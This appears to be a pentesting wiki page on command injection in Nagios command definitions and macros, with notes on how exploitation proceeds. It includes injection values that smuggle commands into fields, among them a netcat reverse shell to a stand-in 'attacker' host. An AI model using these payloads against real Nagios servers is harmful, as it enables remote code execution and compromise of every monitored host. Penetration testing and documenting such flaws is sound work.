---
title: "Command and plugin injection: injecting into Nagios command definitions"
description: "Nagios runs check and notification commands built from command definitions and macros ($USER1$, $HOSTADDRESS$, $ARG1$). Where an attacker with configuration access, or a value that flows into a macro, can influence the command string, shell metacharacters inject commands that execute on the Nagios server when the check or notification runs."
keywords:
  - command definition
  - macros
  - $ARG1$
  - plugin injection
  - nagios server
---

# Command and plugin injection

Nagios executes checks and notifications by expanding command definitions, templates that reference macros like `$USER1$` (the plugin path), `$HOSTADDRESS$`, `$SERVICEOUTPUT$`, and `$ARG1$`, into a command line run by the monitoring server. If an attacker can influence any value that flows into that command line, through configuration access (adding or editing a command, host, or service in Nagios XI's UI or Core's config), or through a monitored value that is placed into a macro and then into a command (for example a host attribute or a check result used in a notification command), then injecting shell metacharacters causes arbitrary commands to run on the Nagios server when the check or notification fires. This is server-side code execution as the Nagios user.

```bash
# where you can edit a command/host/service (e.g. Nagios XI config), set a field that
# reaches the command line to include metacharacters:
#   host address:  127.0.0.1; id            (if $HOSTADDRESS$ is passed to a shell)
#   command line:  $USER1$/check_x; id      (inject into the command definition)
#   $ARG1$ value:  x; nc attacker 4444 -e /bin/sh
# the injected command runs on the Nagios server when the check/notification executes
```

## Exploitation notes

- The injectable point is any attacker-influenced value that lands in a command line: a host address or custom attribute, a check argument, or the command definition itself, wherever Nagios builds a shell command from it.
- Configuration access (Nagios XI UI, or Core config write) is the direct route; a monitored value that reaches a notification/event-handler command is the indirect route.
- Execution is on the Nagios server as its service user, which also holds the credentials for every monitored host (in check definitions and NRPE/SSH configs), so server execution cascades to the estate.
- This complements [NRPE abuse](nrpe-abuse.md) (agent-side) and is often reachable through the authenticated [Nagios XI](nagios-xi-exploits.md) interface.

## References

- [Nagios: object/command configuration and macros](https://www.nagios.org/documentation/)
- [HackTricks: Nagios](https://book.hacktricks.xyz/network-services-pentesting/5666-pentesting-nrpe)
